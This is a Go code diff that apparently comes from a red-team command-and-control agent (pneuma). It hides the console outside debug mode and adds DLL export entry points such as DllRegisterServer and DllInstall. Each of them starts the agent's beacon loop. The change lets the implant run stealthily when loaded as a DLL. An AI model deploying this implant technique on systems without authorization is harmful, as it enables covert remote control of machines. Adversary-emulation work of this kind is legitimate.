@@ -1,6 +1,5 @@
 package main
 
-// #include "library.h"
 import "C"
 import (
 	"github.com/preludeorg/pneuma/sockets"
@@ -11,14 +10,12 @@ import (
 
 var randomHash = "JWHQZM9Z4HQOYICDHW4OCJAXPPNHBA"
 
-func init() {
-	util.HideConsole()
-}
+func main() {}
 
-func main() {
-	agent := util.BuildAgentConfig()
-	if *util.DebugMode {
-		util.ShowConsole()
+func start(agent *util.AgentConfig) {
+	util.DebugMode = &agent.Debug
+	if !*util.DebugMode {
+		util.HideConsole()
 	}
 	if !strings.Contains(agent.Address, ":") {
 		util.DebugLogf("Your address is incorrect\n")
@@ -30,7 +27,32 @@ func main() {
 	sockets.EventLoop(agent, agent.BuildBeacon())
 }
 
+//export VoidFunc
+func VoidFunc() {
+	agent := util.BuildAgentConfig()
+	start(agent)
+}
+
 //export RunAgent
 func RunAgent()  {
-	main()
+	agent := util.BuildAgentConfig()
+	start(agent)
+}
+
+//export DllInstall
+func DllInstall() {
+	agent := util.BuildAgentConfig()
+	start(agent)
+}
+
+//export DllRegisterServer
+func DllRegisterServer() {
+	agent := util.BuildAgentConfig()
+	start(agent)
+}
+
+//export DllUnregisterServer
+func DllUnregisterServer() {
+	agent := util.BuildAgentConfig()
+	start(agent)
 }
